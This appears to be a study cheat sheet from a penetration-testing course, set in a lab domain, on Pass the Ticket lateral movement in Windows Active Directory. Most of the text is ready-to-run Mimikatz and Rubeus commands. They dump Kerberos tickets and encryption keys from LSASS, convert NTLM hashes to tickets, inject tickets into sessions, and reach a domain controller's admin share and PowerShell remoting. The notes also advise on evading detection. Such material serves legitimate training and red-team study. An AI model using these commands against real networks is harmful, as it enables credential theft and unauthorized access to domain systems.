# Pass the Ticket (PtT) from Windows

## 1. Concept Overview

**Pass the Ticket (PtT)** is a lateral movement technique that uses **Kerberos tickets** instead of NTLM hashes.

Instead of authenticating with a password or hash, the attacker:

* **Steals or forges Kerberos tickets**
* **Injects them into a session**
* Authenticates to services as the ticket owner

Key advantage:

* No password or hash needed once the ticket is loaded
* Bypasses NTLM-related defenses

---

## 2. Kerberos Refresher (Minimal)

* **TGT (Ticket Granting Ticket)**
  Allows requesting service tickets (TGS)

* **TGS (Ticket Granting Service)**
  Allows access to a specific service (CIFS, LDAP, MSSQL, etc.)

Kerberos tickets are:

* Stored in **LSASS**
* Bound to a **logon session**
* Reusable until expiration

---

## 3. Ticket Collection on Windows

### 3.1 Export Tickets with Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
```

Notes:

* Requires **local administrator**
* Exports tickets as `.kirbi` files
* Includes **TGTs and TGSs**
* Computer account tickets end with `$`
* `krbtgt` ticket = **TGT**

---

### 3.2 Dump Tickets with Rubeus (Base64)

```cmd
Rubeus.exe dump /nowrap
```

Notes:

* Requires admin to dump all sessions
* Outputs tickets in **Base64**
* Easier to copy/paste than `.kirbi`
* Recommended on newer Windows versions

---

## 4. Pass the Key (OverPass the Hash)

### 4.1 Extract Kerberos Keys (Mimikatz)

```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

Notes:

* Dumps Kerberos encryption keys:

  * `aes256_hmac`
  * `aes128_hmac`
  * `rc4_hmac`
* **AES keys preferred** (less detectable)
* Requires local admin

---

### 4.2 OverPass the Hash with Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Notes:

* Converts NTLM hash → Kerberos credentials
* Spawns a new `cmd.exe`
* Allows requesting Kerberos tickets as the user
* Requires admin

---

### 4.3 OverPass the Hash with Rubeus (No Admin)

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

Notes:

* Requests a **TGT**
* Outputs Base64 ticket
* Does **not** require admin
* AES preferred over RC4 (no downgrade alert)

---

## 5. Pass the Ticket (Ticket Injection)

### 5.1 Inject Ticket with Rubeus (`/ptt`)

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Notes:

* Requests and immediately **injects** the TGT
* Ticket is added to current session
* Ready for lateral movement

---

### 5.2 Inject `.kirbi` Ticket (Rubeus)

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Notes:

* Imports a ticket from disk
* Works for TGT or TGS
* Ticket must be valid (not expired)

---

### 5.3 Inject Base64 Ticket (Rubeus)

```cmd
Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

Notes:

* Useful when ticket was dumped as Base64
* Avoids file handling

---

### 5.4 Inject Ticket with Mimikatz

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\ticket.kirbi"
exit
```

Notes:

* Injects ticket into current session
* Requires admin
* Classic PtT method

---

## 6. Lateral Movement Validation

```cmd
dir \\DC01.inlanefreight.htb\c$
```

Notes:

* CIFS access confirms ticket usage
* Works only if ticket grants permissions

---

## 7. PowerShell Remoting with PtT

### 7.1 Mimikatz + PowerShell Remoting

```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\path\to\john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
```

Notes:

* Uses Kerberos authentication
* User must be allowed for PS Remoting
* No admin required if in **Remote Management Users**

---

### 7.2 Rubeus Sacrificial Logon (Stealth)

```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Notes:

* Creates a **LOGON_TYPE 9** session
* Does not overwrite existing tickets
* Equivalent to `runas /netonly`

---

### 7.3 Inject Ticket into Sacrificial Session

```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

Then:

```cmd
powershell
Enter-PSSession -ComputerName DC01
```

Notes:

* Clean separation of sessions
* Highly effective for stealth lateral movement

---

## 8. Detection & Notes

* **AES tickets** are normal in modern domains
* RC4 usage may trigger **encryption downgrade alerts**
* Ticket lifetime limits persistence
* PtT bypasses password rotation

---

## 9. Key Takeaways

* PtT abuses **Kerberos trust**, not passwords
* OverPass the Hash bridges NTLM → Kerberos
* Rubeus = more flexible, less privilege-heavy
* Tickets = access, not identity verification
